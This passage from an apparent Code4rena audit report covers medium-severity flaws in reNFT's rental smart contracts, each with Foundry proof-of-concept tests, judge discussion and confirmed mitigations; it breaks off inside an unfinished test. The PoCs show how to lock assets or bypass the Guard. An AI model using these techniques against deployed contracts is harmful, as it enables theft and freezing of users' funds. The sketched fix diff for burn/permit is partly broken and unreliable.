*Submitted by [AkshaySrivastav](https://github.com/code-423n4/2024-01-renft-findings/issues/501), also found by EV\_om ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/622), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/617)), [oakcobalt](https://github.com/code-423n4/2024-01-renft-findings/issues/619), [SBSecurity](https://github.com/code-423n4/2024-01-renft-findings/issues/612), [0xdice91](https://github.com/code-423n4/2024-01-renft-findings/issues/558), [serial-coder](https://github.com/code-423n4/2024-01-renft-findings/issues/551), [0xDING99YA](https://github.com/code-423n4/2024-01-renft-findings/issues/535), [imare](https://github.com/code-423n4/2024-01-renft-findings/issues/439), [trachev](https://github.com/code-423n4/2024-01-renft-findings/issues/435), J4X ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/428), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/156)), [rbserver](https://github.com/code-423n4/2024-01-renft-findings/issues/424), [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/394), [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/364), hals ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/346), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/345)), [0xA5DF](https://github.com/code-423n4/2024-01-renft-findings/issues/313), BARW ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/300), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/274), [3](https://github.com/code-423n4/2024-01-renft-findings/issues/269), [4](https://github.com/code-423n4/2024-01-renft-findings/issues/266), [5](https://github.com/code-423n4/2024-01-renft-findings/issues/229)), [Jorgect](https://github.com/code-423n4/2024-01-renft-findings/issues/257), [said](https://github.com/code-423n4/2024-01-renft-findings/issues/224), 0xAlix2 ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/154), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/68)), [ZdravkoHr](https://github.com/code-423n4/2024-01-renft-findings/issues/131), [BI\_security](https://github.com/code-423n4/2024-01-renft-findings/issues/126), [kaden](https://github.com/code-423n4/2024-01-renft-findings/issues/120), [marqymarq10](https://github.com/code-423n4/2024-01-renft-findings/issues/92), [rokinot](https://github.com/code-423n4/2024-01-renft-findings/issues/34), [haxatron](https://github.com/code-423n4/2024-01-renft-findings/issues/26), and [rvierdiiev](https://github.com/code-423n4/2024-01-renft-findings/issues/24)*

The `Guard::updateHookStatus` function is designed to allow protocol administrators to manage the status of hooks within the system. Hooks serve as essential components that customize and control flow of transactions within the protocol.

The vulnerability occurs when administrators disable the `onStop` hook using `Guard::updateHookStatus`. If the `onStop` hook gets disabled after a rental is created using that hook then that causes critical disruption in the rental closing flow.

This happens because the hook address is supplied by lender and renter at the time of rental creation, Both `onStart` and `onStop` gets executed on that user provided address at rental creation and stoppage respectively. Once a rental gets created its hook address cannot be modified. If the `onStop` hook gets disabled while the rental was active then the `stopRent` transaction will always revert.

```solidity
        if (!STORE.hookOnStop(target)) {
            revert Errors.Shared_DisabledHook(target);
        }
```

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L210-L212>

### Proof of Concept

1.  Suppose the `onStart` and `onStop` hooks are initially set as active by administrators for a particular contract address.
2.  A user creates a rental transaction, and a whitelisted hook address is given as input.
3.  The `onStart` hook gets executed as part of the rental creation process.
4.  After some time, an administrator decides to disable the `onStop` hook for the same contract address.
5.  As a result, users are unable to stop the rental, as the `onStop` hook will always revert any attempt to do so.

This sequence of events can result in situations where rentals cannot be stopped due to the disabling of critical hooks, causing potential issues and disruptions within the protocol.

The assets of lender and ERC20 payments will remain stuck in the renter's safe and escrow contract respectively.

Since this bug is dependent upon an admin interaction I am reporting it as `medium`.

The following foundry test shows the process described above. Add this test case in `test/hooks/restricted-selector/RestrictedSelectorHook.t.sol` file and run using command `forge test --mp test/hooks/restricted-selector/RestrictedSelectorHook.t.sol`.

<details>
<summary>
Click to expand Foundry Test
</summary>

```javascript
 function test_toggle_hook_status() public {
     // create a bitmap that will disable the `train()` function selector
     uint256 bitmap = 1;

     // Define the hook for the rental
     Hook[] memory hooks = new Hook[](1);
     hooks[0] = Hook({
         target: address(hook),
         itemIndex: 0,
         extraData: abi.encode(bitmap)
     });

     // start the rental with hook.
     RentalOrder memory rentalOrder = _startRentalWithGameToken(1, hooks);
     bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);
     assertEq(STORE.orders(rentalOrderHash), true);

     // Admin disables the onStop hook
     vm.prank(deployer.addr);
     guard.updateHookStatus(address(hook), uint8(3));    // 011

     // User tries to stop the rental
     // But txn always reverts
     vm.warp(block.timestamp + 500);
     vm.prank(alice.addr);
     vm.expectRevert(abi.encodeWithSelector(
         Errors.Shared_DisabledHook.selector,
         address(hook)
     ));
     stop.stopRent(rentalOrder);
     assertEq(STORE.orders(rentalOrderHash), true);
 }
```

</details>

### Recommended Mitigation Steps

Consider rethinking about the need of `onStop` hook status because if `onStart` hook is executed for a rental then the `onStop` hook must also be executed irrespective of the hook status.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/501#issuecomment-1910706849)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/9) - `onStart` and `onStop` hook functions are now independent of one another and do not both need to be implemented at the same time.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/11) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/38).

***

## [[M-05] DOS possible while stopping a rental with erc777 tokens](https://github.com/code-423n4/2024-01-renft-findings/issues/487)
*Submitted by [CipherSleuths](https://github.com/code-423n4/2024-01-renft-findings/issues/487), also found by [BARW](https://github.com/code-423n4/2024-01-renft-findings/issues/320)*

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L100>

If an order involves erc777 token for a pay order then in the `tokensReceived` callback the renter can create DOS situation resulting in the lender's assets being stuck in the rental safe.

### Proof of Concept

[ERC777 token standard](https://eips.ethereum.org/EIPS/eip-777) which is backward compatible with `erc20` implies that on the transfer of the tokens the recipient can implement a `tokensReceived` hook to notify of any increment of the balance.

Now suppose a pay order is created with an erc 777 consideration asset as there is no restriction on that and also the eip specifies that

    The difference for new contracts implementing ERC-20 is that tokensToSend and tokensReceived hooks take precedence over ERC-20. Even with an ERC-20 transfer and transferFrom call, the token contract MUST check via ERC-1820 if the from and the to address implement tokensToSend and tokensReceived hook respectively. If any hook is implemented, it MUST be called. Note that when calling ERC-20 transfer on a contract, if the contract does not implement tokensReceived, the transfer call SHOULD still be accepted even if this means the tokens will probably be locked.

So the `tokensReceived` hook is optional for a `transfer/transferFrom` call. Hence sending the assets from the lender's wallet to the escrow contract shouldn't be an issue.

Now when the rental period is over or in/between, the `stopRent` method in stop policy is called, which calls `settlePayment` in escrow module. Now on the token transfer

            (bool success, bytes memory data) = token.call(
                abi.encodeWithSelector(IERC20.transfer.selector, to, value)
            );

The `tokensReceived` hook if implemented by the renter, would be called and they could just `revert the tx` inside the `tokensReceived` hook which would mean that the assets lent by the lender are locked forever.

### Recommended Mitigation Steps

It is recommended to prohibit erc777 tokens from being used as consideration items.

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/487#issuecomment-1917115475):**
> Batching all the ERC777 token issues together.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/487#issuecomment-1922080633)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>
> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.

**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/51), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/39) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/12).
***

## [[M-06] Incorrect ordering for deletion allows to flash steal rented NFT's](https://github.com/code-423n4/2024-01-renft-findings/issues/466)
*Submitted by [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/466), also found by [piyushshukla](https://github.com/code-423n4/2024-01-renft-findings/issues/589) and ladboy233 ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/237), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/182))*

User's can flash steal NFT's circumventing any restrictions imposed on the NFT

### Proof of Concept

When stopping a rental,the rented asset (ERC721/ERC1155) is transferred before the actual existance of the order is checked.

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L293-L302>

```solidity
        // @audit rented assets are transferred here
        _reclaimRentedItems(order);

        ESCRW.settlePayment(order);

        // @audit this is where the existance of the order is actually verified
        STORE.removeRentals(
            _deriveRentalOrderHash(order),
            _convertToStatic(rentalAssetUpdates)
        );
```

Since ERC721/ERC1155 transfers invoke the `onReceived` functions in case of a contract receiver, it allows an attacker to create a rental order after stopping it first. This gives the attacker unrestricted access to the rented NFT.

### Example Scenario

1.  Attacker rents a restricted NFT N.
2.  Attacker calls stopRent with a non-existing PAY order(pay order's allow to stop the rent at the same block as creation) keeping the offer item as NFT N and creator as an attacker controlled contract.
3.  Since order existance check is done only at last, NFT N is transferred to the attacker's contract.
4.  Attacker performs anything he wants to do with the NFT bypassing any restrictions imposed.
5.  Attacker creates the order and fills it in seaport (attacker can obtain the server signature earlier itself or replay the signature of a similar order). This will populate the orderHash in the existing orders mapping.
6.  The initial execution inside stopRent continues without reverting since the order is now actually a valid one.

### POC Code

<https://gist.github.com/10xhash/a6eb9552314900483a1cffe91243a169>

### Recommended Mitigation Steps

Check for the order existance initially itself in the stopRent function

**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/466#issuecomment-1914414758):**
 > Would be good to get sponsor comment here. For context see previous comment chain [here](https://github.com/code-423n4/2024-01-renft-findings/issues/237#issuecomment-1913253755).


**[Alec1017 (reNFT) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/466#issuecomment-1915105583):**
 > Tested out the PoC. I believe it to be a valid PoC that correctly demonstrates the concept.
> 
> However, the asset cannot be "stolen" since it must be given back to the rental safe by the time the "flash steal" ends.
> 
> So, I wouldnt say it results in direct loss of funds, or even temporary freezing of funds.
> 
> I will say that this does allow the attacker to interact with the asset in any way they see fit, which directly bypasses restrictions that the lender enables via hook contracts. I could see an example where a flash stolen NFT is used with a function selector on a contract to interact with some on-chain game, which the lender may have explicitly wanted to forbid. 
> 
> But I'll leave the final decision on the severity to the judges on this.

**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-renft-findings/issues/466#issuecomment-1915639168)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/13) - Checks if a rental order exists right away when stopping a rental. Prevents stopping of an order that doesn't exist, only to create it during a callback in the `stopRent()` execution flow.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/13), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/52) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/40).

***

## [[M-07] Upgrading modules via `executeAction()` will brick all existing rentals](https://github.com/code-423n4/2024-01-renft-findings/issues/397)
*Submitted by [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/397), also found by [oakcobalt](https://github.com/code-423n4/2024-01-renft-findings/issues/434), [trachev](https://github.com/code-423n4/2024-01-renft-findings/issues/365), and [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/359)*

All assets from rentals pre-upgrade will be locked. Users can't recover them as old rentals can't be stopped.

### Proof of Concept

The protocol has a functionality to [upgrade modules via `Kernel::executeAction()`](https://github.com/re-nft/smart-contracts/blob/main/src/Kernel.sol#L285).

That upgrade functionality [performs some checks, initializes the new modules, and reconfigures policies](https://github.com/re-nft/smart-contracts/blob/main/src/Kernel.sol#L383-L411), but it doesn't migrate any data, nor transfer any assets.

Modules can hold assets, such as in the case of the `PaymentEscrow`, as well as keeping rentals states in storage.

The [current implementation of the `PaymentEscrow`](https://github.com/re-nft/smart-contracts/blob/main/src/modules/PaymentEscrow.sol) for example doesn't have any mechanism for migrations, or to stop rentals, or withdraw assets if the module was upgraded via `executeAction()`.

This will result in all previous rentals assets being locked, as rentals can no longer be stopped.

The following POC proves that old rentals can't be stopped, as well as showing how the old contract is still holding the users funds.

Create a new test in `smart-contracts/test/integration/Upgrade.t.sol` with this code:

<Details>

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

import {
    Order,
    FulfillmentComponent,
    Fulfillment,
    ItemType as SeaportItemType
} from "@seaport-types/lib/ConsiderationStructs.sol";

import {Errors} from "@src/libraries/Errors.sol";
import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

import {BaseTest} from "@test/BaseTest.sol";
import {ProtocolAccount} from "@test/utils/Types.sol";

import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
import {Safe} from "@safe-contracts/Safe.sol";

import {SafeL2} from "@safe-contracts/SafeL2.sol";
import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
import {Proxy} from "@src/proxy/Proxy.sol";

import {Kernel, Actions} from "@src/Kernel.sol";

contract UpgradeDrain is BaseTest {
    function test_StopRent_UpgradedModule() public {
        // create a BASE order
        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the order creation
        (
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) = finalizeOrder();

        // create an order fulfillment
        createOrderFulfillment({
            _fulfiller: bob,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });

        // finalize the base order fulfillment
        RentalOrder memory preUpgradeRental = finalizeBaseOrderFulfillment();

        bytes memory paymentEscrowProxyInitCode = abi.encodePacked(
            type(Proxy).creationCode,
            abi.encode(
                address(paymentEscrowImplementation),
                abi.encodeWithSelector(
                    PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,
                    address(kernel)
                )
            )
        );

        // <<Upgrade the Escrow contract >>

        PaymentEscrow OLD_ESCRW = ESCRW;

        bytes12 protocolVersion = 0x000000000000000000000420;
        bytes32 salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);

        vm.prank(deployer.addr);
        PaymentEscrow NEW_ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));

        vm.prank(deployer.addr);
        kernel.executeAction(Actions.UpgradeModule, address(NEW_ESCRW));

        // speed up in time past the rental expiration
        vm.warp(block.timestamp + 750);

        bytes32 payRentalOrderHash = create.getRentalOrderHash(preUpgradeRental);

        // assert that the rent still exists
        assertEq(STORE.orders(payRentalOrderHash), true);
        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);

        // assert that the ERC20 tokens are on the OLD contract
        assertEq(erc20s[0].balanceOf(address(OLD_ESCRW)), uint256(100));
        assertEq(erc20s[0].balanceOf(address(NEW_ESCRW)), uint256(0));

        // assert that the token balances are in the OLD contract and haven't been migrated
        assertEq(OLD_ESCRW.balanceOf(address(erc20s[0])), uint256(100));
        assertEq(NEW_ESCRW.balanceOf(address(erc20s[0])), uint256(0));

        // The rental can no longer be stopped
        vm.expectRevert();
        vm.prank(alice.addr);
        stop.stopRent(preUpgradeRental);
    }
}
```

</details>

### Recommended Mitigation Steps

Provide a method for users to migrate old rentals to the upgraded contracts, such as a `migrate()` function, executable by them or the protocol.

Another way is to provide a way to stop all rentals before the upgrade, in order to start with a fresh new module, or allow users to stop rentals from old modules.


**[Alec1017 (reNFT) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1910471559):**
 > This is intended behavior. Upgrading modules is seen as an extremely rare thing, which will only be done in the absense of active rentals.
> 
> Would probably be more appropriate for this to be QA.

**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1914420417):**
 > @Alec1017 - How would this state be achieved? If the protocol is seeing broad adoption it seems likely that there are essentially always going to be outstanding rentals with no clear ability to recall them all.

**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1915453926):**
> Our co-signing technique allows us to stop signing off on allowing new rentals, so if we wanted to upgrade everything, we would stop co-signing on orders that use the old contracts and wait for all active orders to expire.
> 
> Of course, this only works when a max rent duration is introduced, which is a planned mitigation for this audit.

**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1915659794):**
 > Thanks. I think M is the correct severity since the code as audited doesn't practically allow for this functionality to work without major implications.  Even with a max duration, essentially pausing the protocol for that long is a DOS and probably means M is correct.

**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1917105555):**
 > Hey there, I dont think I was very clear about the point of upgrading in this manner. Upgrading via the kernel is not meant to be the "normal" way a storage contract is upgraded, this is why they're proxies as well.
> 
> Our protocol is modular, which allows the deployment of multiple versions of the same contracts. In the future, you could imagine multiple iterations of our protocol being introduced, which can be rolled in and out simultaneously. We can choose to deprecate one storage module by only allowing people to stop rentals via the situation i described above, and also allow them to initiate rentals with newer versions.
> 
> Hopefully this is helpful context!

***

## [[M-08] Assets in a Safe can be lost](https://github.com/code-423n4/2024-01-renft-findings/issues/323)
*Submitted by [LokiThe5th](https://github.com/code-423n4/2024-01-renft-findings/issues/323), also found by [EV\_om](https://github.com/code-423n4/2024-01-renft-findings/issues/630), sin1st3r\_\_ ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/584), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/581)), [trachev](https://github.com/code-423n4/2024-01-renft-findings/issues/539), [rbserver](https://github.com/code-423n4/2024-01-renft-findings/issues/430), [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/384), [yashar](https://github.com/code-423n4/2024-01-renft-findings/issues/369), [Coverage](https://github.com/code-423n4/2024-01-renft-findings/issues/367), [hals](https://github.com/code-423n4/2024-01-renft-findings/issues/347), [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/337), [roleengineer](https://github.com/code-423n4/2024-01-renft-findings/issues/324), [KupiaSec](https://github.com/code-423n4/2024-01-renft-findings/issues/262), [oakcobalt](https://github.com/code-423n4/2024-01-renft-findings/issues/247), [Giorgio](https://github.com/code-423n4/2024-01-renft-findings/issues/216), [said](https://github.com/code-423n4/2024-01-renft-findings/issues/212), [krikolkk](https://github.com/code-423n4/2024-01-renft-findings/issues/132), [BI\_security](https://github.com/code-423n4/2024-01-renft-findings/issues/130), [SBSecurity](https://github.com/code-423n4/2024-01-renft-findings/issues/108), [Qkite](https://github.com/code-423n4/2024-01-renft-findings/issues/99), [rokinot](https://github.com/code-423n4/2024-01-renft-findings/issues/70), [anshujalan](https://github.com/code-423n4/2024-01-renft-findings/issues/57), and [0xAlix2](https://github.com/code-423n4/2024-01-renft-findings/issues/30)*

The `Guard.sol` contract is enabled on Safe's and uses the [`_checkTransaction`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195-L293) function to ensure that transactions that the Safe executes do not transfer the asset out of the Safe.

The `checkTransaction` function achieves this by isolating the function selector and checking that it is not a disallowed function selector. For instance: `safeTransferFrom`, `transferFrom`, `approve`, `enableModule`, etc.

The list does not, however, check for calls to `burn` the token, neither does it check if it is a `permit`. The sponsor has noted the following:

> The [Guard](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol) contract can only protect against the transfer of tokens that faithfully
implement the ERC721/ERC1155 spec.

But this does not acknowledge the fact that an ERC721/ERC1155 implementation can still be an honest implementation and have extra functionality. In particular, the `burn` function is a common addition to many ERC721 contracts, usually granted through inheriting `ERC721Burnable`.

For example, the following projects all have a `burn` function, and Safe's protected by `Guard.sol` that hold these NFTs will be vulnerable to loss of assets via a malicious renter:

*   [Pudgy Penguins](https://etherscan.io/address/0xbd3531da5cf5857e7cfaa92426877b022e612cf8#writeContract)
*   [Lil Pudgies](https://etherscan.io/address/0x524cab2ec69124574082676e6f654a18df49a048#writeContract)
*   [Oh Ottie](https://etherscan.io/address/0x7ff5601b0a434b52345c57a01a28d63f3e892ac0#code#F3#L45)

These are three that are in the top 10 projects on Opensea at the time of writing.

### Proof of Concept

We can see in the `Guard.sol` file that certain function selectors are imported to be tested against:

    import {
        shared_set_approval_for_all_selector,
        e721_approve_selector,
        e721_safe_transfer_from_1_selector,
        e721_safe_transfer_from_2_selector,
        e721_transfer_from_selector,
        e721_approve_token_id_offset,
        e721_safe_transfer_from_1_token_id_offset,
        e721_safe_transfer_from_2_token_id_offset,
        e721_transfer_from_token_id_offset,
        e1155_safe_transfer_from_selector,
        e1155_safe_batch_transfer_from_selector,
        e1155_safe_transfer_from_token_id_offset,
        e1155_safe_batch_transfer_from_token_id_offset,
        gnosis_safe_set_guard_selector,
        gnosis_safe_enable_module_selector,
        gnosis_safe_disable_module_selector,
        gnosis_safe_enable_module_offset,
        gnosis_safe_disable_module_offset
    } from "@src/libraries/RentalConstants.sol";

From the `_checkTransaction` function we see that there is no check for `burn`, `burnFrom` or `permit`.

A malicious renter who is renting the asset can still execute `burn` (common), `burnFrom` (rare) or `permit` (popularized by [Uni v3](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/base/ERC721Permit.sol#L52C9-L86)), which will lead to loss of the asset.

### Coded PoC

The below test can be placed in the `CheckTransaction.t.sol` test file. It should be run with `forge test --match-test test_PoC -vvvv`

        function test_PoC() public {
            bytes4 burn_selector = 0x42966c68;
            // Create a rentalId array
            RentalAssetUpdate[] memory rentalAssets = new RentalAssetUpdate[](1);
            rentalAssets[0] = RentalAssetUpdate(
                RentalUtils.getItemPointer(address(alice.safe), address(erc721s[0]), 0),
                1
            );

            // Mark the rental as actively rented in storage
            _markRentalsAsActive(rentalAssets);

            // Build up the `transferFrom(address from, address to, uint256 tokenId)` calldata
            bytes memory burnCalldata = abi.encodeWithSelector(
                burn_selector,
                69
            );

            // Expect revert because of an unauthorized function selector
            _checkTransactionRevertUnauthorizedSelector(
                address(alice.safe),
                address(erc721s[0]),
                burn_selector,
                burnCalldata
            );
        }

The console output is:

    Encountered 1 failing test in test/unit/Guard/CheckTransaction.t.sol:Guard_CheckTransaction_Unit_Test
    [FAIL. Reason: call did not revert as expected] test_PoC() (gas: 96093)

This shows that the `checkTransaction` would not protect against calls to `burn` the asset.

### Recommended Mitigation Steps

Although not a catch-all, adding checks for `burn`, `burnFrom` and `permit` functions (which are common in smart contracts) should prevent this in most cases.

Selectors:

*   `burn`: `0x42966c68`
*   `burnFrom`: `0x1fe41211`
*   `permit` : `0xabae8f0d`

In the `Guard.sol` file:

<Details>

```diff
        } else if (selector == e1155_safe_transfer_from_selector) {
            // Load the token ID from calldata.
            uint256 tokenId = uint256(
                _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)
            );

            // Check if the selector is allowed.
            _revertSelectorOnActiveRental(selector, from, to, tokenId);
+       } else if (selector == burn_selector) {
+           // Load the extension address from calldata.
+           address extension = address(
+               uint160(
+                    uint256(
+                       _loadValueFromCalldata(data, burn_selector_offset)
+                   )
+               )
+           );
+
+            _revertSelectorOnActiveRental(selector, from, to, tokenId);
+       } else if (selector == burn_From_selector) {
+           // Load the extension address from calldata.
+           address extension = address(
+               uint160(
+                    uint256(
+                       _loadValueFromCalldata(data, burn_From_selector_offset)
+                   )
+               )
+           );
+
+            _revertSelectorOnActiveRental(selector, from, to, tokenId);
+       } else if (selector == permit_selector) {
+           // Load the extension address from calldata.
+           address extension = address(
+               uint160(
+                    uint256(
+                       _loadValueFromCalldata(data, permit_selector_offset)
+                   )
+               )
+           );
+
+            _revertSelectorOnActiveRental(selector, from, to, tokenId);
+       } 
```
</details>

*Please note that there may be other flavours of the `permit` function that have different signatures.*

**[141345 (Lookout) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1902725917):**
 > [Issue 587](https://github.com/code-423n4/2024-01-renft-findings/issues/587) has a detailed discussion about `permit()`.

**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1908940377):**
 > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1912774849):**
 > Originally commented on https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1912630065
> 
> But same thing applies here, I don't think this can be called out of scope but do think M is more appropiate.

**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1915456905):**
 > Given the justification for #587, M severity seems fair.

**[lokithe5th (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916119263):**
 > @0xean thank you for your judging efforts. 
> 
> As the author of this submission I would like to highlight a mistake in my report: the Safe itself will not be calling the `permit()` function, only signing a transaction that approves a `permit`. Adding a check for the `permit` selector will not be effective. 
> 
> I draw attention to this fact because I do not want the sponsor to believe they have guarded against the `permit` vulnerability by implementing the suggested fix, while they may still in fact be vulnerable to it.
> 
> However, the PoC and the suggested fix remain valid for `burn` and `burnFrom` functions. 
> 
> Credit to issue #587 and @stalinMacias for pointing this nuance out.

**[0xStalin (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916150182):**
 > Thanks @lokithe5th. 
> 
> I believe this issue is completely valid in regards to the `burn` functionality and is providing the right mitigation for it.

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/5) - Added support for burnable ERC721 and ERC1155 tokens.

**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/53), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/55) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/14).

***

## [[M-09] `Guard::checkTransaction` restricts native ETH transfer from user's safes](https://github.com/code-423n4/2024-01-renft-findings/issues/292)
*Submitted by [AkshaySrivastav](https://github.com/code-423n4/2024-01-renft-findings/issues/292), also found by [KupiaSec](https://github.com/code-423n4/2024-01-renft-findings/issues/261)*

The `Guard::checkTransaction` function's current design unintentionally restricts native ETH transfers from the safe. This limitation originates from a data length check that requires transaction data to be at least `4 bytes` long, aiming to validate the presence of a function selector.

However, since native ETH transfers have empty data fields, they fail this, leading to an inability to execute such transfers.

This results in a significant functional restriction, as users are unable to execute standard ETH transfers from their safes.

The Safe contracts contains `receive` function which by default enables them to receive native ETH. These native tokens can be transferred to safe by protocol users or current/future protocol hooks.

```solidity
    receive() external payable {
        emit SafeReceived(msg.sender, msg.value);
    }
```

### Proof of Concept

The `Guard::checkTransaction` is designed to validate transactions initiated by a rental safe. Its role is to ascertain whether a transaction meets the set criteria based on its destination, value, data and operation type. This function is a critical component in ensuring that transactions are executed in accordance with the protocol's rule.

A notable issue within the `Guard::checkTransaction` function is its requirement for transaction data to be at least 4 bytes long, as indicated by this code:

In `src/policies/Guard.sol`

```solidity
328        // Require that a function selector exists.
329        if (data.length < 4) {
330            revert Errors.GuardPolicy_FunctionSelectorRequired();
331        }
```

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L328C1-L331C10>

This condition is ideal for transactions involving function calls where a function selector is necessary.

However, this becomes problematic for native ETH transfers, which are characteristically simple transactions without any data payload. As these transactions have a data length of zero bytes, failing the imposed condition.

Such transactions are automatically rejected by the `Guard::checkTransaction` function due to not meeting the 4-byte data length requirement.

The inability to transfer native ETH not only reduces the safe's practicality but also poses a severe limitation on user operations, affecting trust and reliability in the system.

The following foundry test shows the process described above. Copy and paste it into test folder to run.

<details>
<summary>
Click to expand Foundry Test
</summary>

```javascript
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

import {BaseTest} from "@test/BaseTest.sol";
import {SafeProxyFactory} from "@safe-contracts/proxies/SafeProxyFactory.sol";
import {SafeL2} from "@safe-contracts/SafeL2.sol";
import {ISafe} from "@src/interfaces/ISafe.sol";
import {Enum} from "@safe-contracts/common/Enum.sol";
import {Errors} from "@src/libraries/Errors.sol";

contract SafeStuckEth is BaseTest {

    // In this test case we'll see how ETH transfers works fine for normal Gnosis Safes
    // But doesn't work for ReNFT Safes
    function test_poc() public {
        vm.startPrank(alice.addr);

        // Create a new safe by directly interacting with Gnosis safe factory
        SafeProxyFactory safeFactory = factory.safeProxyFactory();
        SafeL2 safeSingleton = factory.safeSingleton();
        address[] memory owners = new address[](1);
